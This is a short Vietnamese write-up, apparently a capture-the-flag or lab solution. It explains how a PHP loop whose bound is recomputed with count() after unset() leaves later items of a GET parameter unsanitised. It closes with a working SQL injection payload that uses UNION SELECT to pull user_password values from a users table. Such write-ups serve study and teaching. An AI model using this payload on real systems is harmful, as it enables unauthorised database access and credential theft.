# Solution

Focus vào đoạn code sau:

```php
$tmp = explode(',',$_GET['ids']);
for ($i = 0; $i < count($tmp); $i++ ) {
    $tmp[$i] = (int)$tmp[$i];
    if( $tmp[$i] < 1 ) {
        unset($tmp[$i]);
    }
}
```

Ta thấy điều kiện dừng của vòng lặp for không hề cố định mà được tính lại bằng `count($tmp)`. Và giá trị này có thể bị thay đổi bởi `unset($tmp[$i])` => lợi dụng điểm này để làm cho các phần tử phía sau của mảng `$tmp` không được check

Final payload:

`a,a,0,1)) UNION SELECT user_password, 2 ,3 FROM users --`